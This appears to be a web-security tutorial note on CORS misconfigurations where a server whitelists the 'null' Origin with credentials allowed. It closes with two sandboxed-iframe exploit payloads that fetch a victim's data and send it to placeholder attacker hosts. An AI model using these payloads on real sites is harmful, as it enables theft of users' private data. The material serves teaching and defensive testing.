# Whitelisted null origin value

The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:

* Cross-origin redirects.
* Requests from serialized data.
* Request using the `file:` protocol.
* Sandboxed cross-origin requests.

Some applications might whitelist the null origin to support local development of the application. For example, suppose an application receives the following cross-origin request:

```
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

And the server responds with:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access.

For example, this can be done using a sandboxed iframe cross-origin request of the form:

1. Iframe with `src` attribute with HTML Content is cross domain,

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
	var req = new XMLHttpRequest();
	req.onload = reqListener;
	req.open('get','vulnerable-website.com/sensitive-victim-data',true);
	req.withCredentials = true;
	req.send();

	function reqListener() {
		location='malicious-website.com/log?key='+this.responseText;
	};
</script>"></iframe>
```

2. iframe with `srcDoc` attribute with HTML Content is not cross domain

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','$url/accountDetails',true);
    req.withCredentials = true;
    req.send();

	function reqListener() {
        location='$exploit-server-url/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
